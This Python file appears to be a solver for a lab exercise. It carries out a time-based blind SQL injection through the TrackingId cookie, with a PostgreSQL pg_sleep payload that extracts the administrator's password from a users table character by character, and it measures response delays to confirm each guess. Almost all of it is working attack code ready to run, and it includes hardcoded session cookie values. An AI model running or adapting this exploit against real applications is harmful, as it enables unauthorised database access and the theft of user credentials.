import requests
import time


""" 
    This file contain the sending_payload function use to send the payload containing the bad_SQLi (time-based) 
            
"""
def bad_sql_query(indice: str=None, parameter: str=None):
    bad_sql = f"' || (SELECT CASE WHEN (SELECT SUBSTRING(password,{indice},1) FROM users WHERE username = 'administrator'){parameter} THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
    return bad_sql

"""Here the function you need if you want to use cookies !!!!!"""


def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int):
    
    #The payload is in the bad_sql_query function
    
    bad_sql1 = bad_sql_query(indice, payload_parameter1)
    
    #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
    cookies = {
        'TrackingId': f"XjQ2JwV5JfB2cKtB{bad_sql1}",
        'session': 'f3J77lM9osm20WxoZHpww4HvYl2uQTfm'
    }
    
    """Where the magic happens, we start the clock to know how much time the server answer to us"""
    
    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    end_time = time.time()
    
    """Here we will know if the SQL_query will work, with a simple boolean operation"""

    result_bool = (end_time - start_time) >= 5
    
    
    if result_bool:
        print(f"This parameter work: {payload_parameter1}")
    else:
        print("")    
    
        
    bad_sql2 = bad_sql_query(indice, payload_parameter2)
    cookies = {
            'TrackingId': f"a7s2nqSm2F5JvzWr	{bad_sql2}",
            'session': 'FQo0PLt1aAaifSB1Su54nQhlr4C624ga'
        }
    
    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    end_time = time.time()
    
    
    result_control = (end_time - start_time) >= 5
    
    
    if result_control:
        print(f"Value found with this parameter: {payload_parameter2}")
    else:
        print("")  
        
          
    return result_bool, result_control


